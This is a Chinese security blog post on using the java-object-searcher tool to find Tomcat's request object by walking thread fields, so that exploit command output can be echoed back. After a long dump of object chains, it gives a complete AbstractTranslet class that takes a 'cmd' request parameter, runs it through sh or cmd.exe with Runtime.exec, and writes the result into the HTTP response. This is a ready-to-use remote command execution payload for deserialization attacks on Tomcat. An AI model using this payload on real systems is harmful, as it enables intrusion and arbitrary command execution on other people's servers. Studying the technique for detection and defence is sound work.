---
title: "利用java-object-searcher构造Tomcat线程回显"
onlyTitle: true
date: 2025-4-9 16:34:52
categories:
- java
- 内存马
tags:
- Tomcat
- 内存马
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8144.jpg
---





提前说好，回显并不是内存马

## Java-object-searcher

Java-object-searcher找的是全局变量

为何要考虑全局变量呢？这是因为只有是全局的，我们才能保证漏洞触发时可以拿到这个对象。毕竟这就是个为挖掘漏洞回显而制作的工具

按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过`Thread.currentThread()`或`Thread.getThreads()`获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。比如前段时间先知上的李三师傅通过查看代码，发现`[MBeanServer](https://xz.aliyun.com/t/7535)`中也有request对象。

所以本工具是遍历线程，而不是其他动态对象。正因为是遍历线程，所以只要程序运行到了servlet，在Evaluate中无论哪个栈帧使用本工具都一样

JAR我已经编译好了放在Github：https://github.com/godownio/TomcatMemshell/blob/master/java-object-searcher-0.1.0-jar-with-dependencies.jar

```java
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("Request").build());
//定义黑名单
List<Blacklist> blacklists = new ArrayList<>();
blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
// 设置黑名单
searcher.setBlacklists(blacklists);
//打开调试模式,会生成log日志
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path("D:\\");
searcher.searchObject();
```

因为控制台缓冲区有限的原因，看控制台会遗漏相当多的信息，所以还是看输出文件

报ClassNotFoundException看issue，应该放到jre/lib/ext目录下

https://github.com/c0ny1/java-object-searcher/issues/7

实际链子是相当之多的，文章不长我就都贴进来了，但是考虑到都是从TaskThread中获取，这种手法都大差不差，就只写一个

```java
#############################################################
   Java Object Searcher v0.01
   author: c0ny1<root@gv7.me>
   github: http://github.com/c0ny1/java-object-searcher
#############################################################


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> global = {org.apache.coyote.RequestGroupInfo}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> global = {org.apache.coyote.RequestGroupInfo} 
           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>} 
            ---> [0] = {org.apache.coyote.RequestInfo}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [3] = {java.lang.Thread} 
     ---> target = {org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor} 
      ---> this$0 = {org.apache.catalina.core.StandardEngine} 
       ---> children = {java.util.HashMap<java.lang.String, org.apache.catalina.Container>} 
        ---> [localhost] = {org.apache.catalina.core.StandardHost} 
             ---> pipeline = {org.apache.catalina.core.StandardPipeline} 
              ---> first = {org.apache.catalina.valves.AccessLogValve} 
               ---> logElements = {class [Lorg.apache.catalina.valves.AbstractAccessLogValve$AccessLogElement;} 
                ---> [9] = {org.apache.catalina.valves.AbstractAccessLogValve$RequestElement}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> applicationRequest = {org.apache.catalina.connector.RequestFacade}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.parameter_parse_failed_reason] = {org.apache.catalina.connector.Request$6}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.core.DISPATCHER_TYPE] = {org.apache.catalina.connector.Request$1}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.ASYNC_SUPPORTED] = {org.apache.catalina.connector.Request$3}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.coyote.streamID] = {org.apache.catalina.connector.Request$9}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.tomcat.sendfile.support] = {org.apache.catalina.connector.Request$7}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.parameter_parse_failed] = {org.apache.catalina.connector.Request$5}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.core.DISPATCHER_REQUEST_PATH] = {org.apache.catalina.connector.Request$2}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.coyote.connectionID] = {org.apache.catalina.connector.Request$8}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@15f35c3:java.nio.channels.SocketChannel[connected local=/10.152.85.47:8080 remote=/10.152.85.47:11248]] = {org.apache.coyote.http11.Http11Processor} 
             ---> request = {org.apache.coyote.Request} 
              ---> notes = {class [Ljava.lang.Object;} 
               ---> [1] = {org.apache.catalina.connector.Request} 
                  ---> specialAttributes = {java.util.Map<java.lang.String, org.apache.catalina.connector.Request$SpecialAttributeAdapter>} 
                   ---> [org.apache.catalina.realm.GSS_CREDENTIAL] = {org.apache.catalina.connector.Request$4}



```

这里需要介绍一下深度优先和广度优先的差别：https://www.cnblogs.com/nice0e3/p/14897670.html

深度优先可以挖一些比较少见的链子，但是我的建议是把depth从小逐渐调大，效果会非常好。

一般来说挖短链子，省时高效的办法还是广度优先

上面我们用的搜索方式是广度优先，搜索到了RequestInfo后，我在调试器中打开确实有这个对象，而且下面就能取到Request，这个手法正是Latch1师傅找到的通用回显的链子，只不过从StandardContext中获取的RequestGroupInfo，而此处是遍历线程获取。但是为什么result文件并没有直接输出这个Request，而是输出到了RequestInfo就停止了呢？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250408175542840.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250408181537537.png)

带着疑惑的心情，发现作者为了避免重复搜索，会在遇到重复节点时退栈

此处的重复搜索并不是指搜索到了RequestGroupInfo后，就不会继续搜索下面的RequestInfo变量了。注意看，RequestInfo下面又有global={RequestGroupInfo}，正是因为这个节点已经遇到过了，所以退栈，而没有输出Request

思考一下深度搜索会碰到req吗？答案也是不会。所以注定会漏掉一些链子，但是能找到一条链子也是完全够用了，毕竟要不Thread被ban掉，导致所有的都不能用，要不就都能使用。

## 构造回显

利用线程来构造回显

值得注意的是，上图是在thread[14]取到的NioEndpoint$Poller，但是不一定每次在14的位置能找到该变量，经过验证，以下三个变量都存在NioEndpoint$Poller，这里就选择名字比较有特征的`http-nio-port-Acceptor`，特征选择为`http-nio`和`Acceptor`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250409142647492.png)

从org.apache.coyote.Request -> org.apache.catalina.connector.Request :

```java
request.getNote(1);
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250409162041627.png)

```java
package org.example.tomcatmemshell.Generic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.apache.tomcat.util.net.NioEndpoint;

import java.lang.reflect.Field;
import java.util.ArrayList;

//TargetObject = {org.apache.tomcat.util.threads.TaskThread}
//  ---> group = {java.lang.ThreadGroup}
//   ---> threads = {class [Ljava.lang.Thread;}
//    ---> [14] = {java.lang.Thread}
//     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
//      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
//         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
//          ---> global = {org.apache.coyote.RequestGroupInfo}
//           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}
//            ---> [0] = {org.apache.coyote.RequestInfo}
public class GenericTomcatMemShell4 extends AbstractTranslet {
    static {
        try {
            String pass = "cmd";
            Thread TaskThread = Thread.currentThread();
            ThreadGroup threadGroup = TaskThread.getThreadGroup();
            Thread[] threads = (Thread[]) getClassField(ThreadGroup.class,threadGroup,"threads");
            for(Thread thread:threads){
                if(thread.getName().contains("http-nio")&&thread.getName().contains("Acceptor")){
                    Object target = getClassField(Thread.class,thread,"target");
                    NioEndpoint this0 = (NioEndpoint) getClassField(Class.forName("org.apache.tomcat.util.net.NioEndpoint$Acceptor"),target,"this$0");
                    Object handler = getClassField(AbstractEndpoint.class,this0,"handler");
                    RequestGroupInfo global = (RequestGroupInfo) getClassField(Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler"),handler,"global");
                    ArrayList<RequestInfo> processors = (ArrayList<RequestInfo>) getClassField(RequestGroupInfo.class,global,"processors");
                    for (RequestInfo requestInfo : processors) {
                        Request Coyoterequest = (Request) getClassField(RequestInfo.class,requestInfo,"req");
                        org.apache.catalina.connector.Request request = ( org.apache.catalina.connector.Request)Coyoterequest.getNote(1);
                        String cmd = request.getParameter(pass);
                        if (cmd != null) {
                            String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            //回显
                            java.io.Writer writer = request.getResponse().getWriter();
                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                            usingWriter.setAccessible(true);
                            usingWriter.set(request.getResponse(), Boolean.FALSE);
                            writer.write(output);
                            writer.flush();
                        }
                        break;
                    }
                    break;
                }
            }
        }catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250409163137634.png)